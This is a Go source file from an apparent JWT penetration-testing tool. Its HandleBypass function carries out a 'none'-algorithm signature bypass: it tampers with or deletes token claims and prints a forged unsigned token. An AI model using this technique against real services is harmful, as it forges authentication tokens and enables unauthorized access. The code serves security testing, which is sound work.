package commands

import (
	"fmt"

	"github.com/golang-jwt/jwt/v5"
	"github.com/n0m-d/jwto/internal/app"
	"github.com/n0m-d/jwto/internal/ui"
)

// HandleBypass processes the bypass command for Signature Bypass attacks.
func HandleBypass(token *jwt.Token, alg string, claims map[string]string, deleteClaims []string, claimsJSON string) error {
	var valg jwt.SigningMethod

	if alg == "default" {
		valg = token.Method
	} else {
		var ok bool
		valg, ok = app.NoneAlgs[alg].(jwt.SigningMethod)
		if !ok {
			return fmt.Errorf("invalid algorithm: %s. Supported: none, None, NONE", alg)
		}
	}

	updatedClaims, err := app.TamperClaims(token, claims, deleteClaims, claimsJSON)
	if err != nil {
		return fmt.Errorf("tampering claims: %w", err)
	}

	newToken, unsignedToken, err := app.GenerateUnsignedToken(token, valg, updatedClaims)
	if err != nil {
		return fmt.Errorf("generating unsigned token: %w", err)
	}

	ui.PrintRawToken(unsignedToken)
	ui.GenTokenTree(newToken)
	return nil
}
